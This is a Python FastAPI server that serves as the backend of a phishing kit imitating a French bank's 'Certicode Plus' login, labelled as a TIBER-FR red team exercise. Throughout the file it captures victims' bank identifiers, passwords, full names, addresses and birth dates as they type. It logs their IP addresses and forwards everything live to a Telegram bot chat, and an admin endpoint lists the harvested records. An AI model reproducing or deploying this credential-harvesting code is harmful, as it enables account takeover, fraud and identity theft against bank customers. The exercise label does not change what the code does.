from fastapi import FastAPI, APIRouter, Request, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import uuid
import httpx
import html
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import Optional, Dict, Any
from datetime import datetime, timezone


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env")

mongo_url = os.environ["MONGO_URL"]
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ["DB_NAME"]]

app = FastAPI(title="Certicode Plus - TIBER-FR Red Team Exercise")
api_router = APIRouter(prefix="/api")

# ---------- Models ----------

class SessionCreate(BaseModel):
    user_agent: Optional[str] = None
    referrer: Optional[str] = None


class SessionOut(BaseModel):
    session_id: str
    created_at: str


class ProgressIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    stage: Optional[str] = None  # 'identifiant' | 'password' | 'identity' | 'completed'
    data: Dict[str, Any] = Field(default_factory=dict)


class ProgressOut(BaseModel):
    ok: bool
    telegram_sent: bool


class SubmissionIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    step: str  # 'login' | 'identity' | 'complete'
    fields: Dict[str, Any] = Field(default_factory=dict)


class SubmissionOut(BaseModel):
    ok: bool
    submission_id: str


# ---------- Helpers ----------

def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _client_meta(request: Request) -> Dict[str, str]:
    fwd = request.headers.get("x-forwarded-for", "")
    ip = fwd.split(",")[0].strip() if fwd else (request.client.host if request.client else "unknown")
    return {
        "ip": ip,
        "user_agent": request.headers.get("user-agent", "unknown"),
    }


def _esc(v: Any) -> str:
    return html.escape(str(v)) if v is not None else ""


def _format_session_message(
    session_id: str,
    meta: Dict[str, str],
    stage: Optional[str],
    started_at: str,
) -> str:
    """Compact session-metadata recap (IP, UA, état, timestamps). Edited as stage/last-update change."""
    stage_label = {
        "identifiant": "🟡 Identifiant en cours",
        "password": "🟠 Mot de passe en cours",
        "identity": "🔵 Vérification d'identité en cours",
        "completed": "✅ Parcours terminé",
    }.get(stage or "", "⏳ Capture en cours")

    return "\n".join([
        "<b>📡 LBP Certicode Plus — Session</b>",
        f"<b>État</b> : {stage_label}",
        f"<b>Session</b> : <code>{_esc(session_id)}</code>",
        f"<b>IP</b> : <code>{_esc(meta.get('ip', '?'))}</code>",
        f"<b>UA</b> : <code>{_esc(meta.get('user_agent', '?')[:160])}</code>",
        f"<b>Démarrage</b> : {_esc(started_at)}",
        f"<b>Dernière màj</b> : {_esc(_now_iso())}",
    ])


def _format_data_message(captured: Dict[str, Any]) -> str:
    """Captured data only (no session metadata). Grows as fields fill in."""
    lines = ["<b>🎯 LBP Certicode Plus — Données capturées</b>", ""]

    ident_lines = []
    if captured.get("identifiant"):
        ident_lines.append(f"• <b>Identifiant</b> : <code>{_esc(captured['identifiant'])}</code>")
    if captured.get("mot_de_passe"):
        ident_lines.append(f"• <b>Mot de passe</b> : <code>{_esc(captured['mot_de_passe'])}</code>")
    if "memorise" in captured:
        ident_lines.append(
            f"• <b>Mémoriser</b> : {'oui' if captured.get('memorise') else 'non'}"
        )
    if ident_lines:
        lines.append("🔐 <b>IDENTIFICATION</b>")
        lines.extend(ident_lines)
        lines.append("")

    id_keys = [
        ("nom", "Nom"),
        ("prenom", "Prénom"),
        ("adresse_complete", "Adresse"),
        ("code_postal", "Code postal"),
        ("ville", "Ville"),
        ("date_naissance", "Date de naissance"),
    ]
    id_lines = [
        f"• <b>{label}</b> : <code>{_esc(captured[k])}</code>"
        for k, label in id_keys
        if captured.get(k)
    ]
    if id_lines:
        lines.append("🪪 <b>IDENTITÉ</b>")
        lines.extend(id_lines)
        lines.append("")

    if len(lines) <= 2:
        lines.append("<i>En attente de saisie…</i>")

    lines.append("<i>Exercice TIBER-FR / DORA — démonstratif</i>")
    return "\n".join(lines)


async def _telegram_send(text: str) -> Optional[int]:
    """Send a new Telegram message. Returns message_id on success."""
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token or not chat_id:
        return None
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as http:
            r = await http.post(url, json=payload)
        j = r.json()
        if r.status_code == 200 and j.get("ok"):
            return j["result"]["message_id"]
        logging.warning(f"telegram send failed: {r.status_code} {r.text[:200]}")
    except Exception:
        logging.exception("Telegram send failed")
    return None


async def _telegram_edit(message_id: int, text: str) -> bool:
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token or not chat_id:
        return False
    url = f"https://api.telegram.org/bot{token}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as http:
            r = await http.post(url, json=payload)
        j = r.json()
        if r.status_code == 200 and j.get("ok"):
            return True
        # 'message is not modified' returns 400 but is harmless
        if "not modified" in r.text:
            return True
        logging.warning(f"telegram edit failed: {r.status_code} {r.text[:200]}")
    except Exception:
        logging.exception("Telegram edit failed")
    return False


async def _push_or_edit_progress(session_id: str, request: Request, stage: Optional[str]) -> bool:
    """Maintain TWO Telegram messages per session: one for session metadata, one for captured data.
    First call sends both; subsequent calls edit them in place."""
    sess = await db.sessions.find_one({"session_id": session_id})
    if not sess:
        return False
    meta = _client_meta(request)
    captured = sess.get("captured_data", {}) or {}
    started_at = sess.get("created_at", "")

    session_text = _format_session_message(session_id, meta, stage, started_at)
    data_text = _format_data_message(captured)

    session_msg_id = sess.get("tg_session_message_id")
    data_msg_id = sess.get("tg_data_message_id")

    sent_any = False
    update_fields = {}

    # Session metadata message
    if session_msg_id:
        if await _telegram_edit(session_msg_id, session_text):
            sent_any = True
    else:
        new_id = await _telegram_send(session_text)
        if new_id is not None:
            update_fields["tg_session_message_id"] = new_id
            sent_any = True

    # Data capture message
    if data_msg_id:
        if await _telegram_edit(data_msg_id, data_text):
            sent_any = True
    else:
        new_id = await _telegram_send(data_text)
        if new_id is not None:
            update_fields["tg_data_message_id"] = new_id
            sent_any = True

    if update_fields:
        await db.sessions.update_one(
            {"session_id": session_id},
            {"$set": update_fields},
        )

    return sent_any


# ---------- Routes ----------

@api_router.get("/")
async def root():
    return {"app": "certicode-plus-redteam", "ok": True}


@api_router.get("/health")
async def health():
    return {
        "status": "ok",
        "telegram_configured": bool(
            os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
            and os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        ),
        "time": _now_iso(),
    }


@api_router.post("/sessions", response_model=SessionOut)
async def create_session(payload: SessionCreate, request: Request):
    meta = _client_meta(request)
    session_id = str(uuid.uuid4())
    doc = {
        "session_id": session_id,
        "created_at": _now_iso(),
        "ip": meta["ip"],
        "user_agent": meta["user_agent"],
        "referrer": payload.referrer or request.headers.get("referer", ""),
        "captured_data": {},
        "tg_session_message_id": None,
        "tg_data_message_id": None,
        "steps": [],
    }
    await db.sessions.insert_one(doc)
    return SessionOut(session_id=session_id, created_at=doc["created_at"])


@api_router.post("/progress", response_model=ProgressOut)
async def push_progress(payload: ProgressIn, request: Request):
    """Progressive update endpoint: merges partial fields into the session-level
    captured_data and sends or edits a single Telegram message so the recap fills
    up as the user types on the site."""
    sess = await db.sessions.find_one({"session_id": payload.session_id})
    if not sess:
        raise HTTPException(status_code=404, detail="session_not_found")

    # Merge new fields, dropping empty strings/None to avoid overwriting filled data with blanks
    merge_set = {}
    for k, v in (payload.data or {}).items():
        if v is None or v == "":
            continue
        merge_set[f"captured_data.{k}"] = v

    if merge_set:
        await db.sessions.update_one(
            {"session_id": payload.session_id},
            {"$set": merge_set},
        )

    sent = await _push_or_edit_progress(payload.session_id, request, payload.stage)
    return ProgressOut(ok=True, telegram_sent=sent)


@api_router.post("/submissions", response_model=SubmissionOut)
async def create_submission(payload: SubmissionIn, request: Request):
    """Step-completion endpoint: records a submission row and also pushes a Telegram update."""
    meta = _client_meta(request)
    submission_id = str(uuid.uuid4())

    sub_doc = {
        "submission_id": submission_id,
        "session_id": payload.session_id,
        "step": payload.step,
        "fields": payload.fields,
        "ip": meta["ip"],
        "user_agent": meta["user_agent"],
        "created_at": _now_iso(),
    }
    await db.submissions.insert_one(sub_doc)

    # Merge fields into session captured_data too
    merge_set = {}
    for k, v in (payload.fields or {}).items():
        if v is None or v == "":
            continue
        merge_set[f"captured_data.{k}"] = v
    if merge_set:
        await db.sessions.update_one(
            {"session_id": payload.session_id},
            {"$set": merge_set},
        )

    await db.sessions.update_one(
        {"session_id": payload.session_id},
        {"$push": {"steps": {"step": payload.step, "submission_id": submission_id, "at": sub_doc["created_at"]}}},
    )

    stage_map = {"login": "password", "identity": "identity", "complete": "completed"}
    await _push_or_edit_progress(payload.session_id, request, stage_map.get(payload.step))

    return SubmissionOut(ok=True, submission_id=submission_id)


@api_router.get("/admin/submissions")
async def list_submissions(token: str):
    expected = os.environ.get("ADMIN_READ_TOKEN", "").strip()
    if not expected or token != expected:
        raise HTTPException(status_code=403, detail="forbidden")
    rows = await db.submissions.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    sessions = await db.sessions.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return {"submissions": rows, "sessions": sessions}


app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get("CORS_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
